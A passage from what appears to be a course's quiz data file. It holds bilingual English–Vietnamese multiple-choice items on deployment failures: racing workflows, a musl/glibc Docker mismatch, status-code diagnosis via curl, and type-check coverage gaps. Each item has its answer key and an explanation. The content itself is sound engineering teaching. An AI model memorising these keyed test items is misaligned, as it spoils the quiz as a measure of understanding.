              'Độ phủ test trên 90%, bắt buộc review mã, và một bộ quét bảo mật ở mỗi lần gộp — ba cái chốt ngăn một commit xấu tới được cuộc deploy ngay từ đầu',
            ),
            B(
              'A <code>concurrency:</code> block on every deploy workflow, an <code>environment:</code> with a reviewer, and a health check after the swap — all three of which are one line each',
              'Một khối <code>concurrency:</code> trên mọi workflow deploy, một <code>environment:</code> có người duyệt, và một phép kiểm sức khoẻ sau khi tráo — cả ba đều dài một dòng',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Both incidents were the same failure with two symptoms: nothing was wrong with either workflow individually, but pushing a commit triggered two of them and there was no coordination between them. So the three properties are the ones whose absence produced exactly that. One deploying workflow, full stop — not "one per environment", because two workflows deploying the same environment are two workflows racing. Genuinely idempotent, not "usually converges" — the second run must not overwrite what the first produced. And rollback on the deploy path, because otherwise every failed deploy is an outage and every deploy is a decision to accept outages. Option 4 is the tempting one and it is the specific mistake the notes warn about: <code>concurrency:</code> queues, does not enforce ordering across separate workflows unless they share a group, and does not make anything idempotent — and both July incidents involved two <em>different</em> workflows, so a per-workflow block would not have prevented them. Push-to-deploy is not primitively unsafe; it demands properties this repository did not have, and the honest response was to stop until it does.',
            'Cả hai sự cố là cùng một cú hỏng với hai triệu chứng: chẳng có gì sai ở từng workflow xét riêng, nhưng đẩy một commit lên là kích hoạt hai cái, và giữa chúng không có sự phối hợp nào. Nên ba tính chất ấy chính là những thứ mà sự VẮNG MẶT của chúng đẻ ra đúng chuyện đó. Một workflow deploy, chấm hết — không phải "mỗi môi trường một cái", vì hai workflow cùng deploy một môi trường là hai workflow ĐUA nhau. Bất biến thật sự, không phải "thường thì hội tụ" — lượt chạy thứ hai không được ghi đè lên thứ lượt đầu đã tạo ra. Và rollback nằm trên đường deploy, vì nếu không thì mỗi cuộc deploy hỏng là một sự cố và mỗi cuộc deploy là một quyết định chấp nhận sự cố. Phương án 4 là cái hấp dẫn và nó đúng là sai lầm cụ thể mà sổ ghi chú cảnh báo: <code>concurrency:</code> XẾP HÀNG, không áp đặt được thứ tự giữa các workflow riêng biệt trừ khi chúng chung nhóm, và không làm cho thứ gì bất biến cả — mà cả hai sự cố tháng 7 đều dính tới HAI workflow KHÁC NHAU, nên một khối theo từng workflow hẳn cũng không ngăn được. Push-để-deploy không phải bản chất là mất an toàn; nó ĐÒI những tính chất mà kho này không có, và phản ứng trung thực là dừng lại cho tới khi có.',
          ),
        }),

        // q47 · đáp án 3
        mcq({
          prompt: B(
            'From this repository\'s notes, an outage caused by one missing flag on a build command:' + code(
              '18/08/2026 — deploy-nha.sh chay `docker build .` (KHONG -f)\n' +
              '  Default Dockerfile: node:22-alpine (musl)\n' +
              '  Prisma engine:      debian-openssl-3.0.x (glibc)\n' +
              '  => build XANH, day XANH, trao XANH\n' +
              '  => backend restart vo tan, API 502 suot 7 phut',
            ) + 'What is the transferable lesson, and where does the check belong?',
            'Trích sổ của kho này, một sự cố gây ra bởi một cái cờ thiếu trên câu lệnh dựng:' + code(
              '18/08/2026 — deploy-nha.sh chay `docker build .` (KHONG -f)\n' +
              '  Default Dockerfile: node:22-alpine (musl)\n' +
              '  Prisma engine:      debian-openssl-3.0.x (glibc)\n' +
              '  => build XANH, day XANH, trao XANH\n' +
              '  => backend restart vo tan, API 502 suot 7 phut',
            ) + 'Bài học chuyển giao được là gì, và phép kiểm ấy thuộc về chỗ nào?',
          ),
          options: [
            B(
              'That the swap should have been gated on a health check — the outage lasted seven minutes because nothing verified the container after the swap, and a health check is the fix',
              'Rằng cú tráo lẽ ra phải bị chặn bởi một phép kiểm sức khoẻ — sự cố kéo dài bảy phút vì chẳng có gì xác minh container sau khi tráo, và một health check là cách chữa',
            ),
            B(
              'That the base image should never be Alpine in production, because musl-linked images cannot run prebuilt native binaries and the mismatch is unavoidable rather than accidental',
              'Rằng ảnh nền không bao giờ nên là Alpine trên production, vì các ảnh liên kết musl không chạy được các nhị phân native dựng sẵn và sự lệch pha ấy là không tránh khỏi chứ không phải tình cờ',
            ),
            B(
              'That the registry should have refused the push, since an image whose engine does not match its libc is malformed and a registry-side validation would have stopped it at the source',
              'Rằng registry lẽ ra phải từ chối lượt đẩy, vì một ảnh có engine không khớp libc của nó là ảnh dị dạng và một phép xác thực phía registry hẳn đã chặn nó ngay từ nguồn',
            ),
            B(
              'That a GREEN BUILD does not mean the image runs — build, push and swap all agreed, and the runtime did not; the libc-versus-engine check belongs BEFORE the push, not at deploy time',
              'Rằng một BẢN DỰNG XANH không có nghĩa là ảnh CHẠY ĐƯỢC — dựng, đẩy và tráo đều đồng ý, còn môi trường chạy thì không; phép kiểm libc-đối-engine thuộc về chỗ TRƯỚC khi đẩy, không phải lúc deploy',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Three separate stages reported success and the artifact ran nowhere. The build machine and the deploy machine agreed the image was valid; the runtime disagreed. That is why the check that was added is a libc-versus-engine assertion placed <em>before the push</em> — a different place buys a different guarantee, and catching it at deploy time means the bad image already exists and somebody is already waiting. The same chapter carries two neighbouring rules from the same reasoning. <code>--no-build</code> on the compose command at the target is one word that removes an entire failure mode: without it, compose is allowed to build if it thinks it needs to, and the moment that happens the production host is a build server competing with its own database for disk — which is how a deploy once failed with <code>no space left on device</code> at 1.8 GB free. And a deploy that only hits <code>/health</code> proves the router mounted, not that a route this deploy changed still works; the smoke test that catches that is an unauthenticated curl of core routes, failing on any 404.',
            'Ba chặng riêng biệt cùng báo thành công và cái hiện vật thì chẳng chạy được ở đâu. Máy dựng và máy deploy đồng ý rằng ảnh hợp lệ; môi trường chạy thì không đồng ý. Vì thế phép kiểm được thêm vào là một khẳng định libc-đối-engine đặt ở chỗ TRƯỚC KHI ĐẨY — chỗ khác nhau mua một bảo đảm khác nhau, và bắt được nó lúc deploy thì cái ảnh xấu đã tồn tại rồi và đã có người đang chờ. Cũng chương ấy mang theo hai luật hàng xóm rút ra từ cùng một lý lẽ. <code>--no-build</code> trên câu lệnh compose ở máy đích là MỘT chữ gỡ bỏ được cả một kiểu hỏng: không có nó thì compose được PHÉP dựng nếu nó nghĩ nó cần, và ngay khoảnh khắc đó máy chủ production trở thành một máy dựng tranh đĩa với chính cơ sở dữ liệu của nó — và đó là cách một cuộc deploy từng hỏng với <code>no space left on device</code> khi đĩa còn 1,8 GB. Còn một cuộc deploy chỉ gõ vào <code>/health</code> thì chứng minh được router đã mount chứ không chứng minh được một route mà chính cuộc deploy ấy vừa đổi còn chạy; phép kiểm bắt được chuyện đó là một cú curl KHÔNG xác thực lên các route lõi, và hỏng ngay khi gặp bất kỳ 404 nào.',
          ),
        }),

        /* ── Chương 10 — chẩn đoán bằng ca thật (2 câu) ───────────────────── */

        // q48 · đáp án 0
        mcq({
          prompt: B(
            'On 2026-07-02 two features broke at once and both survived a fresh login, which made a shared auth bug the obvious hypothesis. Two unauthenticated requests settled it:' + code(
              '$ curl -sI https://api.cuongthai.com/api/v1/gifs\n' +
              'HTTP/1.1 404 Not Found\n' +
              '\n' +
              '$ curl -sI https://api.cuongthai.com/api/v1/messages/threads\n' +
              'HTTP/1.1 401 Unauthorized',
            ) + 'What did those two numbers establish?',
            'Ngày 02/07/2026 hai chức năng chết cùng lúc và cả hai sống sót qua một lần đăng nhập lại, khiến một con bọ xác thực dùng chung thành giả thuyết hiển nhiên. Hai yêu cầu KHÔNG xác thực đã dứt điểm chuyện đó:' + code(
              '$ curl -sI https://api.cuongthai.com/api/v1/gifs\n' +
              'HTTP/1.1 404 Not Found\n' +
              '\n' +
              '$ curl -sI https://api.cuongthai.com/api/v1/messages/threads\n' +
              'HTTP/1.1 401 Unauthorized',
            ) + 'Hai con số đó xác lập điều gì?',
          ),
          options: [
            B(
              'That the two symptoms are unrelated: 401 means the route is MOUNTED and needs auth, 404 means it is NOT mounted — the fingerprint of a stale build, and the auth theory died in one command',
              'Rằng hai triệu chứng KHÔNG liên quan tới nhau: 401 nghĩa là route ĐÃ MOUNT và cần xác thực, 404 nghĩa là nó CHƯA mount — dấu vân tay của một bản dựng CŨ, và giả thuyết xác thực chết trong một câu lệnh',
            ),
            B(
              'That both routes are broken in the same way and the difference in code is a middleware ordering detail, so a single fix to the auth layer would restore both features',
              'Rằng cả hai route đều hỏng theo cùng một cách và khác biệt về mã số chỉ là chi tiết thứ tự middleware, nên một bản vá duy nhất cho tầng xác thực sẽ khôi phục cả hai chức năng',
            ),
            B(
              'That the request was blocked upstream: an unauthenticated probe cannot distinguish an application response from an nginx one, so both numbers describe the proxy rather than the app',
              'Rằng yêu cầu bị chặn ở phía trên: một cú thăm dò không xác thực không phân biệt được phản hồi của ứng dụng với phản hồi của nginx, nên cả hai con số đều mô tả proxy chứ không phải ứng dụng',
            ),
            B(
              'That the session cookie had expired, since a valid session would have turned the 401 into a 200 and the 404 into a 403 for a user without permission on that resource',
              'Rằng cookie phiên đã hết hạn, vì một phiên hợp lệ hẳn đã biến 401 thành 200 và biến 404 thành 403 với một người dùng không có quyền trên tài nguyên đó',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Two failures with a plausible shared cause is a hypothesis, not a fact, and one measurement per symptom is enough to test it. The GIF endpoint answered 404 — the router had no handler for that path, because the image on the server did not contain the compiled route file. The messages endpoint answered 401 — mounted, just requiring auth, and the "disappearing" chats turned out to be a per-viewer <code>deletedAt</code> filter working exactly as designed. Two symptoms, one theory, and a single command showed they were unrelated. The reading rule is worth memorising: 200 means mounted and public, 401 means mounted and needs auth, 403 means mounted and you are refused, and 404 means <em>not mounted</em> — the specific fingerprint of a stale or partial build. This repository codified it as a post-deploy smoke test that fails the deploy on any 404. Note also what is <em>not</em> a diagnostic tool: a browser retries, follows redirects, applies cookies and runs JavaScript, so it is the worst possible instrument for isolating a fault and the default one for reporting it.',
            'Hai cú hỏng có một nguyên nhân chung nghe hợp lý là một GIẢ THUYẾT chứ không phải một sự thật, và mỗi triệu chứng một phép đo là đủ để kiểm nó. Điểm cuối GIF trả 404 — router không có bộ xử lý nào cho đường dẫn ấy, vì cái ảnh trên máy chủ không chứa tệp route đã biên dịch. Điểm cuối tin nhắn trả 401 — đã mount, chỉ là đòi xác thực, và mấy cuộc trò chuyện "biến mất" hoá ra là một bộ lọc <code>deletedAt</code> theo từng người xem đang chạy đúng như thiết kế. Hai triệu chứng, một giả thuyết, và một câu lệnh duy nhất cho thấy chúng chẳng liên quan gì tới nhau. Luật đọc số đáng thuộc lòng: 200 là đã mount và công khai, 401 là đã mount và cần xác thực, 403 là đã mount và bạn bị từ chối, còn 404 là CHƯA MOUNT — dấu vân tay riêng của một bản dựng cũ hoặc dở dang. Kho này đã mã hoá nó thành một smoke test sau deploy, và cuộc deploy hỏng ngay khi gặp bất kỳ 404 nào. Cũng lưu ý thứ KHÔNG phải công cụ chẩn đoán: một trình duyệt tự thử lại, đi theo chuyển hướng, áp cookie và chạy JavaScript, nên nó là dụng cụ tệ nhất có thể để cô lập một lỗi và lại là dụng cụ mặc định để báo cáo lỗi ấy.',
          ),
        }),

        // q49 · đáp án 1
        mcq({
          prompt: B(
            'On 2026-08-08 a Prisma enum value was renamed. The whole pre-push checklist passed and the seed broke on production:' + code(
              'Thay doi: enum ContentType.CODE -> CODE_REVIEW\n' +
              '  npx tsc --noEmit                -> XANH\n' +
              '  (cd frontend && tsc && build)   -> XANH\n' +
              '  npx prisma format / generate    -> XANH\n' +
              'Deploy production -> npx prisma db seed HONG',
            ) + 'Which pair of decisions produced the hole, and what does the fix have to be?',
            'Ngày 08/08/2026 một giá trị enum của Prisma được đổi tên. Toàn bộ pre-push checklist đều qua và seed vỡ trên production:' + code(
              'Thay doi: enum ContentType.CODE -> CODE_REVIEW\n' +
              '  npx tsc --noEmit                -> XANH\n' +
              '  (cd frontend && tsc && build)   -> XANH\n' +
              '  npx prisma format / generate    -> XANH\n' +
              'Deploy production -> npx prisma db seed HONG',
            ) + 'Cặp quyết định nào đã đẻ ra cái lỗ hổng, và bản vá bắt buộc phải là gì?',
          ),
          options: [
            B(
              '<code>prisma generate</code> was run before the schema was saved, so the client was stale; regenerating and re-running the checklist in the right order closes it',
              '<code>prisma generate</code> chạy trước khi lược đồ được lưu, nên client bị cũ; sinh lại rồi chạy lại checklist theo đúng thứ tự là bịt được',
            ),
            B(
              '<code>tsconfig.json</code> excluded <code>prisma/</code> AND the seed hand-wrote its own copy of the enum union, so it type-checked against itself — and BOTH have to change, either alone leaves the hole open',
              '<code>tsconfig.json</code> loại trừ <code>prisma/</code> VÀ tệp seed tự chép tay một bản union của enum, nên nó tự kiểm với chính nó — và PHẢI sửa CẢ HAI, sửa một cái thôi thì cái lỗ vẫn còn',
            ),
            B(
              'The rename belonged in a migration that failed to deploy, so the database still carried the old enum value while the code carried the new one — the seed is a symptom rather than the cause',
              'Cú đổi tên thuộc về một migration deploy hỏng, nên cơ sở dữ liệu vẫn mang giá trị enum cũ trong khi mã mang giá trị mới — tệp seed chỉ là triệu chứng chứ không phải nguyên nhân',
            ),
            B(
              'The seed script was not marked as ESM, so Node resolved a stale compiled copy from <code>dist/</code>; setting the module type makes the checklist cover it automatically',
              'Script seed không được đánh dấu là ESM, nên Node phân giải nhầm một bản đã biên dịch cũ trong <code>dist/</code>; đặt kiểu module là checklist tự động phủ tới nó',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Two decisions that each make sense alone combine into a hole. The main <code>tsconfig.json</code> has <code>rootDir: ./src</code> and the seed lives under <code>prisma/</code>, so including it would force unrelated compilation — into <code>exclude</code> it went, and <code>tsc --noEmit</code> literally never opened the file. And the seed carried a hand-written copy of the enum union, so it type-checked against itself: rename <code>CODE</code> in the schema and the string literals in the seed stayed perfectly consistent with the union in the seed. The fix is necessarily both. Adding a <code>tsconfig.seed.json</code> without removing the duplicated union just type-checks the false type in two places instead of one; removing the union without adding the check leaves the error to surface at runtime, exactly as it did. The generalisable statement is that a checklist has <em>coverage</em> — the set of files it actually examines — and a codebase has <em>surface</em>, and every file in the gap can break without the checklist noticing. A green checklist is evidence about the files it opened, and nothing else. Type-checking is also not running, which is why <code>prisma db seed</code> against a local database joined the list.',
            'Hai quyết định mà xét riêng thì cái nào cũng hợp lý, gộp lại thành một cái lỗ. Tệp <code>tsconfig.json</code> chính có <code>rootDir: ./src</code> còn seed thì nằm dưới <code>prisma/</code>, nên đưa nó vào sẽ kéo theo cả đống biên dịch chẳng liên quan — thế là nó rơi vào <code>exclude</code>, và <code>tsc --noEmit</code> theo đúng nghĩa đen chưa bao giờ mở tệp ấy ra. Còn tệp seed thì mang một bản chép tay của union enum, nên nó TỰ kiểm với CHÍNH NÓ: đổi tên <code>CODE</code> trong lược đồ thì các hằng chuỗi trong seed vẫn nhất quán hoàn hảo với cái union nằm trong seed. Bản vá bắt buộc phải là CẢ HAI. Thêm một <code>tsconfig.seed.json</code> mà không gỡ cái union chép tay thì chỉ là đem kiểu SAI đi kiểm ở hai chỗ thay vì một; gỡ cái union mà không thêm phép kiểm thì để lỗi lòi ra lúc chạy, đúng như đã xảy ra. Phát biểu tổng quát là: một checklist có ĐỘ PHỦ — tập tệp nó thật sự mở ra — còn một kho mã có BỀ MẶT, và mọi tệp nằm trong khe hở giữa hai thứ ấy đều có thể vỡ mà checklist không hay biết. Một checklist xanh là bằng chứng về những tệp nó đã mở, và không gì khác. Kiểm kiểu cũng không phải là CHẠY, và vì thế <code>prisma db seed</code> trên một cơ sở dữ liệu cục bộ đã được thêm vào danh sách.',
          ),
        }),

        /* ── Chương 11 — cái sống sót qua đo đạc (1 câu) ───────────────────── */

        // q50 · đáp án 2
        mcq({
          prompt: B(
            'The wrap-up sorts this course\'s rules into three columns. One of them is headed "comfortable to believe and always wrong", and it contains: <code>|| true</code> makes a step safe; a green build means the image works; a failed migration is fixable with one command. Which entry completes that column, and why does it belong there?',
            'Bài ôn tổng xếp các luật của khoá này vào ba cột. Một cột mang tiêu đề "thoải mái tin và LUÔN SAI", và nó chứa: <code>|| true</code> làm cho một bước an toàn; một bản dựng xanh nghĩa là ảnh chạy được; một migration hỏng vá được bằng một câu lệnh. Mục nào hoàn thiện cột ấy, và vì sao nó thuộc về đó?',
          ),
          options: [
            B(
              '"A cache hit saves time" — measured here, one cache step had never saved a byte, so a hit rate is the only evidence that a cache is doing anything at all',
              '"Trúng cache thì tiết kiệm thời gian" — đo ở đây, một bước cache chưa từng lưu nổi một byte, nên tỉ lệ trúng là bằng chứng DUY NHẤT cho thấy một cái cache có làm gì hay không',
            ),
            B(
              '"A flaky test is infrastructure noise" — sometimes true, more often a race the harness surfaces intermittently, so it belongs in the column of claims that need measuring first',
              '"Một bài test chập chờn là nhiễu hạ tầng" — đôi khi đúng, nhưng thường hơn là một cuộc đua mà bộ chạy test làm lộ ra không đều, nên nó thuộc cột các khẳng định cần ĐO trước đã',
            ),
            B(
              '"Exit code 0 means success" — <code>pkill</code> returned 0 with the wrong process alive, <code>grep -c</code> counted lines not matches, and a pipe-fed <code>set -e</code> lost the status: exit codes need a POST-CONDITION check',
              '"Mã thoát 0 nghĩa là thành công" — <code>pkill</code> trả 0 trong khi tiến trình sai vẫn sống, <code>grep -c</code> đếm DÒNG chứ không đếm LẦN, và một <code>set -e</code> đi qua ống thì mất trạng thái: mã thoát cần một phép kiểm HẬU ĐIỀU KIỆN',
            ),
            B(
              '"An action pinned to a moving ref is a supply-chain surface you do not own" — true by default rather than sometimes, which is why it anchors the first column instead',
              '"Một action ghim vào một ref di động là một bề mặt chuỗi cung ứng không thuộc quyền bạn" — đúng theo mặc định chứ không phải đôi khi, và vì thế nó neo ở cột MỘT chứ không phải cột này',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The three columns are: true by default, true only when you have measured, and comfortable to believe and always wrong. Options 1, 2 and 4 all name real rules from this course — but the first two belong in column two, because each is <em>sometimes</em> true and the measurement decides which time this is, and the fourth is stated as an unconditional property and therefore anchors column one. "Exit code 0 means success" is the one that is always wrong, because a zero is a claim about a process, not about an outcome, and this course collected three independent cases where the two came apart. The remedy that generalises is to check a post-condition rather than a status: after a kill, confirm the port is free; after adding a check, break the thing it checks and watch it turn red; after adding a cache, read three consecutive runs. Above the columns sit two operating rules the wrap-up states plainly: measure before you believe, and remember that the auto-fix which fits the error message is usually wrong, because it assumes the tool understood the problem.',
            'Ba cột là: ĐÚNG theo mặc định, chỉ đúng KHI ĐÃ ĐO, và thoải mái tin mà LUÔN SAI. Phương án 1, 2 và 4 đều nêu tên những luật có thật của khoá này — nhưng hai cái đầu thuộc cột hai, vì mỗi cái chỉ ĐÔI KHI đúng và phép đo mới quyết định lần này là lần nào, còn cái thứ tư được phát biểu như một tính chất vô điều kiện nên nó neo ở cột một. "Mã thoát 0 nghĩa là thành công" mới là cái LUÔN SAI, vì con số không là một lời khẳng định về một TIẾN TRÌNH chứ không phải về một KẾT QUẢ, và khoá này đã gom được ba ca độc lập trong đó hai thứ ấy rời nhau ra. Cách chữa tổng quát hoá được là kiểm một HẬU ĐIỀU KIỆN thay vì kiểm một trạng thái: sau khi diệt tiến trình, hãy xác nhận cổng đã trống; sau khi thêm một phép kiểm, hãy làm hỏng thứ nó kiểm rồi xem nó có chuyển đỏ không; sau khi thêm một cái cache, hãy đọc ba lần chạy liên tiếp. Nằm trên các cột ấy là hai luật vận hành mà bài ôn tổng nói thẳng: ĐO trước khi tin, và nhớ rằng cái bản vá tự động vừa khít với thông báo lỗi thường là bản vá SAI, vì nó giả định rằng công cụ đã hiểu vấn đề.',
          ),
        }),

      ],
    },
  ],
};
